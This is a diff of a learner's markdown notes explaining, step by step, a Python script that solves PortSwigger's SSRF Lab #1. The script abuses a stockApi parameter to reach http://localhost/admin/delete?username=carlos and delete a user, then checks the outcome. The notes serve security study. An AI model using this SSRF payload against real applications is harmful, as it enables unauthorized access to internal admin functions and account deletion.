@@ -9,7 +9,7 @@
 - [X] SSRF Lab #1: [Web-Security Academy](https://portswigger.net/web-security/) -- PortSwigger; [Rana Khalil's Course](https://ranakhalil.teachable.com/);
    - Done with lab#1 today: It was pretty easy and understood the python code [Check out the full code in good format here], which I'm gonna tryna explain you people here below. 
 
-1. Importing all the requests. Also disabling the warnings incase of not having the valid certificate.
+1. Importing all the modules. Also disabling the warnings incase of not having the valid certificate.
 
 ```
 import requests
@@ -17,33 +17,19 @@ import sys
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 ```
-2. This thing is total optional, but inorder to check where you went wrong if the script doesn't work, this is real helpful thing to add onto the script.
+2. This thing is total optional, but in-order to check where you went wrong if the script doesn't work, this is real helpful thing to add onto the script.
 
 ```
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 ```
-3. dd
+3. [If name-main](https://www.freecodecamp.org/news/if-name-main-python-example/): Check out this article to know more about why do we add this. 
+   - My explanation: In simple terms, the python interpreter always checks for this `__name__` function line if it is set to the same. it will execute whatever is mentioned to be executed under it. Also since python is interpreted lang, it checks code line by line. 
 
 ```
-def delete_user(url):
-    delete_user_url_ssrf_payload = 'http://localhost/admin/delete?username=carlos'
-    check_stock_path = '/product/stock'
-    params = {'stockApi': delete_user_url_ssrf_payload}
-    r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)
+if __name__ == "__main__":
+    main()
 ```
-4. dd
-
-```
-    # Check if user was deleted
-    admin_ssrf_payload = 'http://localhost/admin'
-    params2 = {'stockApi': admin_ssrf_payload}
-    r = requests.post(url + check_stock_path, data=params2, verify=False, proxies=proxies)
-    if 'User deleted successfully' in r.text:
-        print("(+) Successfully deleted Carlos user!")
-    else:
-        print("(-) Exploit was unsuccessful.")
-```
-5. dd
+4. Defining the main function. Here if the arguments by the user is not in the correct format or length, the whole program won't execute, otherwise will execute the program, which here is deleting the user Carlos as mentioned to-do in the lab-01 of SSRF.
 
 ```
 def main():
@@ -56,9 +42,27 @@ def main():
     print("(+) Deleting Carlos user...")
     delete_user(url)
 ```
-6. dd
+
+5. After defining the main user, it's time now to define the `delete_user(url)`. The goal of the program is to get the admin access and then delete the user named carlos. While looking to the source code, we got the admin path which was `/admin` and while looking at the admin source code we got the delete user path `/delete?username=carlos`. So here the below code make's the resuest to the url mentioned by the user while excuting this script and does the task.
 
 ```
-if __name__ == "__main__":
-    main()
+def delete_user(url):
+    payload = 'http://localhost/admin/delete?username=carlos' #since we have to delete the carlos username
+    check_stock_path = '/product/stock' 
+    params = {'stockApi': payload} #which is in the response of the stock request
+    r = requests.post(url + check_stock_path, proxies=proxies, verify=False, data=params)
 ```
+6. Now until above the if script executed, the user would have be deleted but what if we want to check if our script worked is correct or not, hence below code. Here we make an another request to the `/admin` path and in the response the script will check for keyword `User deleted successfully`, if mentioned then it is a success, if not - unsuccess. 
+
+```
+    # Check if user was deleted
+    admin_ssrf_payload = 'http://localhost/admin'
+    params2 = {'stockApi': admin_ssrf_payload}
+    r = requests.post(url + check_stock_path, data=params2, verify=False, proxies=proxies)
+    if 'User deleted successfully' in r.text:
+        print("(+) Successfully deleted Carlos user!")
+    else:
+        print("(-) Exploit was unsuccessful.")
+```
+
+
